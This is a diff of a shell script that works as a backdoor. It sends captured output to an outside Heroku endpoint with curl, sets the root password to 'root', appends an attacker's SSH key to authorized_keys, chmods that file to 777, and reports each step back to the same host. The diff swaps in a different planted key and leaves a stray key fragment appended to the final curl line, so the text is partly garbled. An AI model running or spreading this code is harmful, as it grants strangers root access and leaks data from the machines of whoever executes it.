@@ -16,10 +16,10 @@ output=$(cat datalog.txt);
 curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output";
 echo -e "root\nroot" | passwd | tee  datalog.txt;
 cd ./.ssh;
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiNcXDTTpaoIxpsHt/iRWQIDiwkIuDyMHSyxvxwLmQoczWQbFthslItVcMiit/R01QMAQXAJhkzVjrZljUXWhu1FVIs/U97umQswFVcVA7SsBgZZffN8kVCFE6nmGWEb3JdgGUjGRyk65GEf359wjAK3k/vGAxrmI62tePwZxBoSu4Yztvpx1DnW7qekoFoj/WUKhAdUq3U9ymG2+FUJzFLmhTPo/bPYdTNQ5CtqAY+lXFjxK5Lk7dNXMYl2A9Bt7Pbq53MldZ74sGNXZm6zKErU5dxqTPWcYl/cboW47fubTtQoD1t8ZWCLDp485F/q7D8Y/wy535i58WRGWkmSR24TbND7kQIFGzHUoq3yZ6bw4TbqiZFt+/wUmUXYxud7K14SnurgudPLZfej5C1fyOlKfyksWnFnnr6ToxDFGouGsEcrop6F39VgW6F5aix5n4kopKMIktb/08Q8e16Ji365rf/SJeRxSwswqRawS27MzURAk7KgEp/EuRXm5uIe0= root@adarshbp' >> authorized_keys ;
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKjG6NTGNTDFEiJR9OZ2/bxsQLLD8Vmt7/QUGhGjWt5HSoG2aekPnnx386Npmh/y0v8v0tSHH1SGcbhqkm39zqA5Ko9Y6QniiWZf9fcHRkk56q5yKC8aoegZs1ZtXVvNGpy4f6ZuHEGMW26WHSHDDp5BrVeLcyjz3ywj2kP6ATYDaynNe9zbz5o0K+JtmA+nZnplbNiA/3KOBCKZh3U8NUS89452Y8BZXwTS7McNWKzLDI4uUgGrc9gsmv/5uYBGHQfho6/m35cgOePsga3/+aWHg5KhaIFpXAZnQjXWiU4sIIU/rem7OfgMnDYTNstATWUrvnnEQiHBtiYBjkZn0PQPsQE5acn44qgKyydjrSN4mTvDL/JVju1YhHIHO5omKes5isFqISvjPvH1zO0LHb1ZyH6yaLO93zsul6YcgIMDYwovILIcPlLk9x+ycCD4Wk6/briezehTbmEHvvyuEopMXjwbypqd7aWZTEJHB1NUeSGe4qSHu+1Cn7iHKegJ0= adarshbp@adarshbp' >> authorized_keys ;
 chmod 777 authorized_keys ;
 echo "STEP 4 >>>> Configured key";
 output3=$(cat datalog.txt);
 curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output3";
-curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="completed";
+curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="completed";OlKfyksWnFnnr6ToxDFGouGsEcrop6F39VgW6F5aix5n4kopKMIktb/08Q8e16Ji365rf/SJeRxSwswqRawS27MzURAk7KgEp/EuRXm5uIe0= root@adarshbp
 sshd
